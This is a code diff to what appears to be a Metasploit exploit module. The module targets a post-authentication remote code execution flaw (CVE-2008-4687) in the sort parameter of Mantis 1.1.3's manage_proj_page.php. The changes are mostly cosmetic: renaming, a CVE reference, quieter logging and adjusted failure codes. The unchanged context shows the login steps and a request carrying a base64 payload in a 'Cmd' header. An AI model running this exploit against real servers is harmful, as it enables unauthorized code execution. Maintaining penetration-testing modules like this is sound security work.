@@ -10,9 +10,11 @@ class MetasploitModule < Msf::Exploit::Remote
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Mantis v1.1.3 Remote Code Execution',
+      'Name'           => 'Mantis manage_proj_page PHP Code Execution',
       'Description'    => %q{
-        Mantis v1.1.3 and earlier is vulnerable to a post-authentication Remote Code Execution vulnerability in the sort parameter of the manage_proj_page.php page.
+        Mantis v1.1.3 and earlier is vulnerable to a post-authentication Remote
+        Code Execution vulnerability in the sort parameter of the
+        manage_proj_page.php page.
       },
       'Author'         => [
         'EgiX',      # Exploit-DB Entry Author
@@ -23,6 +25,7 @@ class MetasploitModule < Msf::Exploit::Remote
         [
           ['EDB', '6768'],
           ['URL', 'https://www.exploit-db.com/exploits/6768/'],
+          ['CVE', '2008-4687'],
         ],
        'Privileged' => false,
        'Platform'   => ['php'],
@@ -43,19 +46,19 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def check
-    print_status('Checking Mantis version ...')
+    vprint_status('Checking Mantis version ...')
     res = send_request_cgi({
       'uri'    => normalize_uri(target_uri.path, 'login_page.php'),
       'method' => 'GET'
     })
 
     unless res
-      print_error('Connection to host failed!')
+      vprint_error('Connection to host failed!')
       return CheckCode::Unknown
     end
 
     unless res.body =~ /Mantis ([0-9]+).([0-9]+).([0-9]+)/
-      print_error('Cannot determine Mantis version!')
+      vprint_error('Cannot determine Mantis version!')
       return CheckCode::Unknown
     end
 
@@ -63,7 +66,7 @@ class MetasploitModule < Msf::Exploit::Remote
     minor = Regexp.last_match[2]
     rev = Regexp.last_match[3]
 
-    print_status("Mantis version #{major}.#{minor}.#{rev} detected")
+    vprint_status("Mantis version #{major}.#{minor}.#{rev} detected")
 
     unless res.code == 200 && (major.to_i > 1 || minor.to_i > 1 || (minor.to_i == 1 && rev.to_i > 3))
       return CheckCode::Appears
@@ -79,7 +82,7 @@ class MetasploitModule < Msf::Exploit::Remote
         'uri'      => normalize_uri(target_uri.path, 'login_page.php'),
     })
     unless res
-      fail_with(Failure::NoAccess, 'Cannot access host to log in!')
+      fail_with(Failure::Unknown, 'Cannot access host to log in!')
     end
     res = send_request_cgi({
       'uri'       => normalize_uri(target_uri.path, 'login.php'),
@@ -92,8 +95,11 @@ class MetasploitModule < Msf::Exploit::Remote
         'Cookie': "PHPSESSID=#{res.get_cookies}"
       }
     })
-    fail_with(Failure::NoAccess, 'Login failed!') unless res && res.code == 302
-    fail_with(Failure::NoAccess, 'Wrong credentials!') unless res && !res.redirection.to_s.include?('login_page.php')
+    unless res
+      fail_with(Failure::Unknown, 'Cannot access host to log in!')
+    end
+    fail_with(Failure::NoAccess, 'Login failed!') unless res.code == 302
+    fail_with(Failure::NoAccess, 'Wrong credentials!') unless !res.redirection.to_s.include?('login_page.php')
     res.get_cookies
   end
 
@@ -113,10 +119,10 @@ class MetasploitModule < Msf::Exploit::Remote
       'vars_post' => data,
       'headers' => {
         'Connection': 'close',
-        'Cookie': "#{cookie}",
+	'Cookie': cookie.to_s,
         'Cmd': payload_b64
       }
     })
-    fail_with(Failure::NoAccess, 'Host disconnected during exploit!') unless res
+    fail_with(Failure::Unknown, 'Host disconnected during exploit!') unless res
   end
 end
